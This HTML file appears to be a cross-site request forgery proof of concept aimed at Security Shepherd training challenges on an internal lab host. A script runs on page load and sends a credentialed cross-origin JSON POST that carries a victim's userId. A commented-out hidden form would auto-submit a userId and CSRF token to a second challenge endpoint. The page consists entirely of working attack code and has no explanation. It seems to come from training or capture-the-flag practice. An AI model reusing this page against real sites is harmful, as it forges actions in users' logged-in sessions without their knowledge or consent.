<!doctype HTML>
<html>
    <head>
        <title>Crazydais - CSRF</title>
    </head>

    <body>
<!--    
        <form id="csrf" action="https://shepherd.waratek.lan/user/csrfchallengefour/plusplus" method="POST" >
            <input type="hidden" name="userId" value="fcab4e7dfbe01ce4e3904b97febe6a6a184302c3" />
            <input type="hidden" name="csrfToken" value="138480911391839065120583091695078570809" />
        </form> 
-->

        <script>
            (function () {
//                 var form = document.getElementById("csrf");
//                 form.submit();
                
                var cb = function (res) {
                    console.log('Callback Invoked', res);
                }
                
                var url = 'https://shepherd.waratek.lan/user/csrfchallengejson/plusplus';
                var body = '{"userId":"fcab4e7dfbe01ce4e3904b97febe6a6a184302c3"}';
                
                doPost(url, body, cb);
                
            })();
                      
            function doPost(url, data, callback) {
                var req = new XMLHttpRequest();
                req.onreadystatechange = function () {
                    if (req.readyState === 4 && req.status === 200)
                        callback(req.responseText);
                };
                req.open("POST", url, true);
                req.withCredentials = true;
                req.setRequestHeader("X-Requested-With","XMLHttpRequest");
                req.send(data);
                return req.responseText;
            };
            
        </script>
    </body>
</html>
